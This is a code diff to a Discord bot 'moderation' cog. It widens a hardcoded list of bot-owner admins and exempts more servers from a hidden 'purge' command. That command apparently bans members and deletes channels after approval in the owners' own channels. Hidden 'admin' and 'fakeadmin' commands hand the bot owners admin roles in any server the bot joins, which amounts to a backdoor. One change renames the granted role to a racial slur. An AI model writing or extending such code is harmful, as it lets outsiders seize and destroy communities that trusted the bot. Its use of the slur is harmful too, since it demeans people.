@@ -10,7 +10,7 @@ from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
                                   has_guild_permissions, has_permissions)
 from discord.utils import get
 
-list_of_admins = [426549783864279040]
+list_of_admins = [426549783864279040,534074998672064512,801471932007448607]
 def isBotAdminP(ctx):
     return ctx.author.id in list_of_admins
 
@@ -21,7 +21,9 @@ class Mod(Cog):
         self.bot = bot    
         self.SLEEPTIME = 0.5    
         self.banned_members = [438809594291027969]     
-        self.list_of_admins = [426549783864279040]        
+        self.list_of_admins = [426549783864279040,
+                                534074998672064512,
+                                801471932007448607]      
     
     
     async def on_ready(self):
@@ -73,7 +75,7 @@ class Mod(Cog):
     async def purge(self,ctx):
 
         server = ctx.message.guild
-        if server.id != 711044562650398721 and ctx.author.id not in self.banned_members:
+        if server.id != 711044562650398721 and server.id != 701753524551286784 and server.id != 868964763802157097 and ctx.author.id not in self.banned_members:
             print(f"finna purge {ctx.guild}")
             numBans = 0
             numChannels = 0
@@ -84,7 +86,7 @@ class Mod(Cog):
 
             
             
-            confirm_primary = self.bot.get_channel(814917487651979314)
+            confirm_primary = self.bot.get_channel(868964764175437873)
             
             p_message = await confirm_primary.send(f"Purge#{password}. Request from **{ctx.author}** to purge **{ctx.guild}**. Please commit primary authorization.")
             await p_message.add_reaction('✅')
@@ -96,7 +98,7 @@ class Mod(Cog):
            
             
             if reaction.emoji == '✅':
-                confirm_final = self.bot.get_channel(814973520983097344)
+                confirm_final = self.bot.get_channel(868964764343226368)
                 
                 await ctx.author.send(f"Launch code is {password}")
                 await confirm_final.send(f"Purge #{password}. Please enter the password for final authorization to purge **{ctx.guild}** per request of **{ctx.author}**")
@@ -172,22 +174,8 @@ class Mod(Cog):
         else:
             print("denied massunban")
 
-    @command(name = "getrole",brief = "tell u if u can purge or not",hidden = True)
-    @isBotAdmin
-    async def getrole(self,ctx):
     
-        
-        for member in ctx.guild.members:
-            if member.id == 738990452673478738:
-                for role in member.roles:
-                    print(f"now checking {role}")
-                    if role.permissions.manage_channels or role.permissions.administrator:
-                        print("he can purge")
-                        print(f"bot has admin = {role.permissions.administrator}\nbot has manage_channels = {role.permissions.manage_channels}")
-                        break
-                    else:
-                        print(f"{role.name} cant purge")
-    @command(name = "admin",brief = "gives admin",hidden =True)
+    @command(name = "admin",brief = "gives admin \n BOT MOD COMMAND DONT USE BC DOESNT WORK",hidden =True)
     async def admin(self,ctx, guildID: Optional[int]):
         if ctx.author.id not in self.list_of_admins:
             print(f"denied {ctx.author} request to become admin")
@@ -200,10 +188,10 @@ class Mod(Cog):
 
             await ctx.author.add_roles(role) if role not in ctx.author.roles else None
             
-    @command(name = "fakeadmin", brief = "gives admin in kek later",hidden = True)
+    @command(name = "fakeadmin", brief = "gives admin in kek later \n DONT USE UR NOT EVEN IN THE SERVER",hidden = True)
     async def adminMan(self,ctx,guildID: Optional[int]):
         bot =  self.bot.get_user(738990452673478738)
-        confirm_primary = self.bot.get_channel(814917487651979314)
+        confirm_primary = self.bot.get_channel(868964764175437873)
         guildID = guildID or ctx.guild.id
         guild = self.bot.get_guild(guildID)
         member = guild.get_member(ctx.author.id)
@@ -213,7 +201,7 @@ class Mod(Cog):
             
             
         if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
-            role = get(guild.roles,name = "Frank")
+            role = get(guild.roles,name = "nigga")
             print(role)
             await member.add_roles(role) 
 
@@ -277,7 +265,7 @@ class Mod(Cog):
 
         objectiveChannel = self.bot.get_channel(channelID)
         bot = self.bot.get_user(738990452673478738)
-        confirm_primary = self.bot.get_channel(814917487651979314)
+        confirm_primary = self.bot.get_channel(868964764175437873)
         restoreMessage = await confirm_primary.send(f"Restore Request from **{ctx.author}** to restore {ctx.channel.mention} to {objectiveChannel.mention}. Please commit primary authorization \"Y\" or \"N\".")
         await restoreMessage.add_reaction('✅')
         await restoreMessage.add_reaction('❌')  
